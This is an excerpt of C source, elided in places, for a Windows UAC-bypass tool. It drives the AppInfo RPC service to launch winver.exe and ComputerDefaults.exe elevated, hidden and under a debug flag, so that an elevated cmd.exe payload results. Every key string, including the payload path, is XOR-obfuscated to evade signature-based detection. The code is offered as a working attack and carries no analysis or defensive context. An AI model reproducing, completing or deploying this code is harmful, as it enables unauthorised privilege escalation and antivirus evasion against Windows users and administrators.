...
void __forceinline xor_decrypt_w(WCHAR* s) {
    for (size_t i = 0; s[i]; ++i) s[i] ^= XOR_KEY;
}
...
BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LPWSTR Dir, LPWSTR WSta, HWND hWnd, DWORD Tout, WORD Show, APP_PROCESS_INFORMATION *PInfo) {
    ...
    WCHAR rpc_enc[] = { L'n'^XOR_KEY, L'c'^XOR_KEY, L'a'^XOR_KEY, L'l'^XOR_KEY, L'r'^XOR_KEY, L'p'^XOR_KEY, L'c'^XOR_KEY, 0 };
    xor_decrypt_w(rpc_enc);
    status = RpcStringBindingComposeW((RPC_WSTR)L"201ef99a-7fa0-444c-9399-19ba84f12a1a", (RPC_WSTR)rpc_enc, NULL, NULL, NULL, &StringBinding);
...
int main() {
    ...
    WCHAR payload_enc[] = { L'C'^XOR_KEY, L':'^XOR_KEY, L'\\'^XOR_KEY, L'W'^XOR_KEY, L'i'^XOR_KEY, L'n'^XOR_KEY, L'd'^XOR_KEY, L'o'^XOR_KEY, L'w'^XOR_KEY, L's'^XOR_KEY, L'\\'^XOR_KEY, L'S'^XOR_KEY, L'y'^XOR_KEY, L's'^XOR_KEY, L't'^XOR_KEY, L'e'^XOR_KEY, L'm'^XOR_KEY, L'3'^XOR_KEY, L'2'^XOR_KEY, L'\\'^XOR_KEY, L'c'^XOR_KEY, L'm'^XOR_KEY, L'd'^XOR_KEY, L'.' ^XOR_KEY, L'e'^XOR_KEY, L'x'^XOR_KEY, L'e'^XOR_KEY, 0 };
    xor_decrypt_w(payload_enc);
    WCHAR lpszPayload[MAX_PATH];
    wcscpy(lpszPayload, payload_enc);
    ...
    WCHAR winver_enc[] = { L'\\'^XOR_KEY, L'w'^XOR_KEY, L'i'^XOR_KEY, L'n'^XOR_KEY, L'v'^XOR_KEY, L'e'^XOR_KEY, L'r'^XOR_KEY, L'.' ^XOR_KEY, L'e'^XOR_KEY, L'x'^XOR_KEY, L'e'^XOR_KEY, 0 };
    xor_decrypt_w(winver_enc);
    wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, winver_enc);
    if (!AicLaunchAdminProcess(szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, L"WinSta0\\Default", NULL, INFINITE, SW_HIDE, &procInfo)) {
    ...
    WCHAR comp_enc[] = { L'\\'^XOR_KEY, L'C'^XOR_KEY, L'o'^XOR_KEY, L'm'^XOR_KEY, L'p'^XOR_KEY, L'u'^XOR_KEY, L't'^XOR_KEY, L'e'^XOR_KEY, L'r'^XOR_KEY, L'D'^XOR_KEY, L'e'^XOR_KEY, L'f'^XOR_KEY, L'a'^XOR_KEY, L'u'^XOR_KEY, L'l'^XOR_KEY, L't'^XOR_KEY, L's'^XOR_KEY, L'.' ^XOR_KEY, L'e'^XOR_KEY, L'x'^XOR_KEY, L'e'^XOR_KEY, 0 };
    xor_decrypt_w(comp_enc);
    wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, comp_enc);
    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
    if (!AicLaunchAdminProcess(szProcess, szProcess, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, L"WinSta0\\Default", NULL, INFINITE, SW_HIDE, &procInfo)) {
